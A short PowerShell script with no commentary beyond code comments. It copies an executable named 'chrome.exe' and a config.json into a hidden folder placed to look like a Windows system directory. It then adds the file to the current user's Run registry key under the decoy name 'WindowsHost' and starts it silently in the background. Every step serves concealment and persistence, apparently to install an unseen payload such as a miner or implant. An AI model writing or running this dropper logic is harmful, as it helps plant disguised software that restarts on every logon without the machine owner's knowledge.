# Get the directory path where this script is running from
$strPath = Split-Path -Parent $MyInvocation.MyCommand.Path

# Target directory using the environment variable
$strTarget = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\Host"

# Create target dir if it doesn't exist
if (-not (Test-Path -Path $strTarget)) {
    New-Item -ItemType Directory -Path $strTarget | Out-Null
}

# Hide the target folder natively
(Get-Item -Path $strTarget).Attributes = 'Hidden'

# Copy chrome.exe and config.json (Force overwrites if already present)
Copy-Item -Path (Join-Path $strPath "chrome.exe") -Destination (Join-Path $strTarget "chrome.exe") -Force
Copy-Item -Path (Join-Path $strPath "config.json") -Destination (Join-Path $strTarget "config.json") -Force

# Add to current user startup registry
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -Path $RegPath -Name "WindowsHost" -Value (Join-Path $strTarget "chrome.exe") -PropertyType String -Force | Out-Null

# Launch the executable silently in the background
Start-Process -FilePath (Join-Path $strTarget "chrome.exe") -WindowStyle Hidden
